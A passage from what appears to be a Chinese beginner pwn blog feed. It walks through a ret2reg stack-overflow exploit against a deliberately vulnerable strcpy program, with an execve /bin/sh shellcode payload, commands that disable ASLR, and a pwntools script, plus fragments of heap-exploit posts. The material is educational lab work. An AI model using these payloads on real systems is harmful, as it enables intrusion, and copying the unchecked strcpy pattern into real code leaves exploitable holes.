class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt; ) &lt;span class=&#34;comment&#34;&gt;# 0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;b&amp;#x27;&lt;/span&gt; ) &lt;span class=&#34;comment&#34;&gt;# 1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    gdb.attach(sh)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;c&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x1f&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    add(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;d&amp;#x27;&lt;/span&gt; * &lt;span class=&#34;number&#34;&gt;0x1f&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    show(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;a href=&#34;https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html&#34;&gt;https://www.aucyberclub.org/makaleler/2023/01/31/prototypepollution.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/&#34;&gt;https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse-2023/calibrator/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;很多题都不错,好好搞一下有空&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-07-28T10:43:04.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/</id>
        <title>pwn入门-34-rop之ret2reg</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/"/>
        <content type="html">&lt;h1 id=&#34;手法概述&#34;&gt;&lt;a href=&#34;#手法概述&#34; class=&#34;headerlink&#34; title=&#34;手法概述&#34;&gt;&lt;/a&gt;手法概述&lt;/h1&gt;&lt;p&gt;​		这一种攻击手法主要利用的是像如 jmp rsp, jmp rax,call rax这种跳转的指令. 这种指令在一些情况下可以对抗ALSR随机化, 因为比如我们写入一段shellcode,但是不知道shellcode的开始地址,不过,如果有一个寄存器,例如rax,指向shellcode的空间,那么栈溢出后,覆盖返回地址为call rax即可返回到shellcode处进行执行.&lt;/p&gt;
&lt;p&gt;​		主要参考的这一篇文章,利用的这里面的例子,不过在复现的时候,有些地方和文章里有点小区别&lt;/p&gt;
&lt;p&gt;​		&lt;a href=&#34;https://blog.csdn.net/sinat_35695255/article/details/52031813&#34;&gt;https://blog.csdn.net/sinat_35695255/article/details/52031813&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;漏洞代码&#34;&gt;&lt;a href=&#34;#漏洞代码&#34; class=&#34;headerlink&#34; title=&#34;漏洞代码&#34;&gt;&lt;/a&gt;漏洞代码&lt;/h1&gt;&lt;p&gt;ret2reg.c  编译:gcc -Wall -g -o ret2reg ret2reg.c -z execstack -m32 -fno-stack-protector&lt;/p&gt;
&lt;p&gt;打开ALSR echo 2 &amp;gt; &amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_space&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;evilfunction&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *input)&lt;/span&gt; &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buffer[&lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;];    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(buffer, input);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; argc, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **argv)&lt;/span&gt; &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    evilfunction(argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;攻击过程&#34;&gt;&lt;a href=&#34;#攻击过程&#34; class=&#34;headerlink&#34; title=&#34;攻击过程&#34;&gt;&lt;/a&gt;攻击过程&lt;/h1&gt;&lt;h2 id=&#34;寻找溢出长度&#34;&gt;&lt;a href=&#34;#寻找溢出长度&#34; class=&#34;headerlink&#34; title=&#34;寻找溢出长度&#34;&gt;&lt;/a&gt;寻找溢出长度&lt;/h2&gt;&lt;p&gt;​		可以通过gdb调试,也可以通过参考文章作者给的办法&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./ret2reg $(perl -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;printf &amp;quot;A&amp;quot;x524 . &amp;quot;BBBB&amp;quot;&amp;#x27;&lt;/span&gt;)  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;完之后再查看内核崩溃文件,能看到覆盖了返回地址,EIP被设置为BBBB&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714220708831.png&#34; alt=&#34;image-20230714220708831&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;寻找gadget&#34;&gt;&lt;a href=&#34;#寻找gadget&#34; class=&#34;headerlink&#34; title=&#34;寻找gadget&#34;&gt;&lt;/a&gt;寻找gadget&lt;/h2&gt;&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/ret2reg# objdump  -d ret2reg | grep *%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    101d:	ff d0                	call   *%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    110c:	ff d0                	call   *%eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/ret2reg# ROPgadget --binary ret2reg --only=&amp;quot;call&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gadgets information&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;============================================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000010b6 : call dword ptr [eax + 0x51]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000010af : call dword ptr [eax - 0x73]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x000011f0 : call dword ptr [edx - 0x77]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000101d : call eax&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x0000115d : call edx&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Unique gadgets found: 5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;寻找shellcode和寄存器的关系&#34;&gt;&lt;a href=&#34;#寻找shellcode和寄存器的关系&#34; class=&#34;headerlink&#34; title=&#34;寻找shellcode和寄存器的关系&#34;&gt;&lt;/a&gt;寻找shellcode和寄存器的关系&lt;/h2&gt;&lt;p&gt;​		在strcpy后,shellcode的存放地址,也在了eax中(存放返回值),因为strcpy函数的返回值是指向最终的目标字符串 dest 的指针，所以如果有jmp eax或者call eax，就可以转移控制流过去&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714230359708.png&#34; alt=&#34;image-20230714230359708&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;core文件&#34;&gt;&lt;a href=&#34;#core文件&#34; class=&#34;headerlink&#34; title=&#34;core文件&#34;&gt;&lt;/a&gt;core文件&lt;/h2&gt;&lt;p&gt;gdb ret2reg core文件 –q 查看内核崩溃文件, 可以看到崩溃时的情况&lt;/p&gt;
&lt;p&gt;那么,linux 程序崩溃 如何产生core呢?&lt;/p&gt;
&lt;p&gt;ulimit查看,如果为0,就不会产生,需要设置一下,&lt;/p&gt;
&lt;p&gt;ulimit -c unlimited 设置为可以产生coredump且大小不受限制,但仅对当前会话?生效,如果想要永久生效,修改&amp;#x2F;etc&amp;#x2F;profile,加入ulimit -c unlimited即可&lt;/p&gt;
&lt;p&gt;参考链接: &lt;a href=&#34;https://www.tinymind.net.cn/articles/e4c54a679a8b15&#34;&gt;https://www.tinymind.net.cn/articles/e4c54a679a8b15&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;设置core文件路径:&lt;/p&gt;
&lt;p&gt;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;core_pattern 可以设置格式化的 core 文件保存位置或文件名 &lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;/core/core-%e-%p-%t&amp;quot; &amp;gt; /proc/sys/kernel/core_pattern&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://www.ngui.cc/el/1819464.html?action=onClick&#34;&gt;https://www.ngui.cc/el/1819464.html?action=onClick&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;​		这里的一个重点是要找call eax的地址,&lt;/p&gt;
&lt;p&gt;​		echo 0 &amp;gt; &amp;#x2F;proc&amp;#x2F;sys&amp;#x2F;kernel&amp;#x2F;randomize_va_space（作者echo 2, 说是不随机化加载地址,但是我这边随机化了…回头再了解下&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; vmmap&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     Start        End Perm     Size Offset File&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56555000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56558000&lt;/span&gt; r-xp     &lt;span class=&#34;number&#34;&gt;3000&lt;/span&gt;      &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; /root/ret2reg/ret2reg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56558000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x56559000&lt;/span&gt; r-xp     &lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;2000&lt;/span&gt; /root/ret2reg/ret2reg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x56559000&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0x5655a000&lt;/span&gt; rwxp     &lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;   &lt;span class=&#34;number&#34;&gt;3000&lt;/span&gt; /root/ret2reg/ret2reg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;方法一&#34;&gt;&lt;a href=&#34;#方法一&#34; class=&#34;headerlink&#34; title=&#34;方法一&#34;&gt;&lt;/a&gt;方法一&lt;/h3&gt;&lt;p&gt;​	0x5655601d&lt;/p&gt;
&lt;figure class=&#34;highlight perl&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./ret2reg $(perl -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;printf &amp;quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&amp;quot; . &amp;quot;A&amp;quot;x499 .&amp;quot;\x1d\x60\x55\x56&amp;quot;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		随机化程度有多少呢? 是否可以枚举	&lt;/p&gt;
&lt;p&gt;​		根据实际情况测试,随机化的大小好像不是很大,可以直接枚举(回头确认下范围)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230714220717124.png&#34; alt=&#34;image-20230714220717124&#34;&gt;&lt;/p&gt;
&lt;p&gt;​			和博客里的那个随机化不一样,博客里说把randomize_va_space设置为2,这里设置为2仍然会随机化,设置为0就都取消了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/ret2reg&lt;span class=&#34;meta&#34;&gt;# echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;root@vultr:~/ret2reg# ./ret2reg $(perl -e &lt;span class=&#34;string&#34;&gt;&amp;#x27;printf &amp;quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&amp;quot; . &amp;quot;A&amp;quot;x499 .&amp;quot;\x1d\x60\x55\x56&amp;quot;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# ls&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;core  &lt;span class=&#34;built_in&#34;&gt;exp&lt;/span&gt;.py  ret2reg  ret2reg.c&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;# exit&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;方法二&#34;&gt;&lt;a href=&#34;#方法二&#34; class=&#34;headerlink&#34; title=&#34;方法二&#34;&gt;&lt;/a&gt;方法二&lt;/h3&gt;&lt;p&gt;​		这里面的三个payload都可以用,本质上没啥区别. 不加架构也能成功,&lt;font color=&#34;red&#34;&gt;注意需要在启动时就传递参数的话,用这种方式 p &amp;#x3D; process(argv&amp;#x3D;[“.&amp;#x2F;ret2reg”,payload])&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.arch= &amp;#x27;i386&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;i386&amp;#x27;&lt;/span&gt;,os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;shellcode = asm(shellcraft.sh())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = shellcode + b&amp;quot;a&amp;quot;*(524-len(shellcode))+p32(0x5655601d)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = b&amp;quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&amp;quot;+b&amp;quot;a&amp;quot;*499+p32(0x5655601d)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80&amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;499&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;b&amp;quot;\x1d\x60\x55\x56&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = process(argv=[&lt;span class=&#34;string&#34;&gt;&amp;quot;./ret2reg&amp;quot;&lt;/span&gt;,payload])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;参考链接:&lt;a href=&#34;https://it.cha138.com/jingpin/show-199849.html&#34;&gt;https://it.cha138.com/jingpin/show-199849.html&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;jmp可以吗? jmp是指什么来.. &lt;/p&gt;
&lt;p&gt;call和jmp的区别&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230718213610314.png&#34; alt=&#34;image-20230718213610314&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-34-rop%E4%B9%8Bret2reg/image-20230718213617649.png&#34; alt=&#34;image-20230718213617649&#34;&gt;&lt;/p&gt;
&lt;p&gt;2.关于随机化地址的问题&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-07-14T14:06:44.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/</id>
        <title>pwn入门-33-houseofspirit</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-33-houseofspirit/"/>
        <content type="html">&lt;p&gt;​		这个东西蛮有意思,可以对内存中一块fastbin大小的不可控内存区域进行读写,但它需要满足两个条件&lt;/p&gt;
&lt;p&gt;​		1.该区域的前后的内存是可控的&lt;/p&gt;
&lt;p&gt;​		2.存在一个可控指针可以作为free函数的参数&lt;/p&gt;
&lt;h2 id=&#34;how2heap的例子&#34;&gt;&lt;a href=&#34;#how2heap的例子&#34; class=&#34;headerlink&#34; title=&#34;how2heap的例子&#34;&gt;&lt;/a&gt;how2heap的例子&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c&#34;&gt;https://github.com/shellphish/how2heap/blob/master/glibc_2.23/house_of_spirit.c&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;确实需要画图,画图的话看得很清晰了就&lt;/p&gt;
